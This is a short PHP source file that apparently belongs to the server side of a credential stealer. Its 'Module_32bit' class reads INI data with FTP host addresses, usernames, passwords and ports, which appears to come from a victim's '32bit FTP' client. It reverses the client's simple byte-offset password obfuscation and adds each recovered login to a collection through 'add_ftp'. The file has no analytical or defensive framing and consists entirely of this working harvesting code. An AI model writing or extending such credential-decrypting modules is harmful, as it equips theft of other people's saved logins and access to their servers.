<?php
class Module_32bit extends Module_
{
    private function Decrypt($Source)
    {
        if (!strlen($Source))
            return '';

        $Result = hex2bin($Source);
        if ($Result === false)
            return '';
		
        for ($i = 0; $i < strlen($Result); $i++)
            $Result[$i] = chr(ord($Result[$i]) - $i);

        return $Result;
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $INI_ = parse_ini($Data);
            if(!$INI_)
                return;

            foreach($INI_  as $Section => $Element)
            {
                $Host = Assign_($Element['HostAddress']);
                $User = Assign_($Element['HostUsername']);
                $Pass = $this->Decrypt(Assign_($Element['HostPassword']));
                $Port = Assign_($Element['HostPort']);

                $this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
            }

            $INI_ = NULL;

            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
